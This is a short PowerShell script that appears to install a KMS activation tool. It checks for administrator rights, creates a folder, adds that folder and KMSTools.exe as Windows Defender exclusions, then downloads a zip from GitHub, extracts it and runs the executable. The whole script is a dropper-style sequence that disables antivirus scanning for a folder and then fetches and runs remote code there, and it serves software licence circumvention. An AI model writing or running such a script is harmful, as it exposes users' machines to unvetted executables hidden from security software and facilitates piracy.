if([Security.Principal.WindowsIdentity]::GetCurrent().Groups -contains 'S-1-5-32-544'){
$adminprev = [Security.Principal.WindowsIdentity]::GetCurrent().Groups -contains 'S-1-5-32-544'
Write-Output $adminprev
}else{
$adminprev = [Security.Principal.WindowsIdentity]::GetCurrent().Groups -contains 'S-1-5-32-544'
Write-Output $adminprev
Timeout /T 500
}

$FileName = "C:\macka32\"
if (Test-Path $FileName) 
{
  Remove-Item $FileName -Force
}

mkdir c:\macka32
Add-MpPreference -ExclusionPath "C:\macka32"
Add-MpPreference -ExclusionPath "C:\macka32\KMS\KMSTools.exe"

Invoke-WebRequest https://github.com/Macka323/Gist/raw/main/KMS.zip -o c:\macka32\KMS.zip
Expand-Archive -LiteralPath "C:\macka32\KMS.zip" -DestinationPath "C:\macka32\KMS" -Force
start c:\macka32\KMS\KMSTools.exe
Timeout /T 200
